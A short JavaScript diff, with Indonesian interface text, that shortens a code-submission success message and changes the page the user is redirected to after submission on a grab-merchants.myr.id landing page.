@@ -298,10 +298,10 @@
       if (!response.ok) throw new Error(result.error || 'Gagal mengirim kode.');
 
       popupTitle.textContent = 'Terkirim';
-      popupMessage.textContent = 'Kode referensi berhasil dikirim.';
+      popupMessage.textContent = 'Berhasil dikirim.';
       popup.classList.add('show');
       window.setTimeout(() => {
-        window.location.assign('https://grab-merchants.myr.id/lp/confirm-and-track-your-order');
+        window.location.assign('https://grab-merchants.myr.id/lp/halaman-akhiran');
       }, 1800);
     } catch (error) {
       popupTitle.textContent = 'Tidak terkirim';
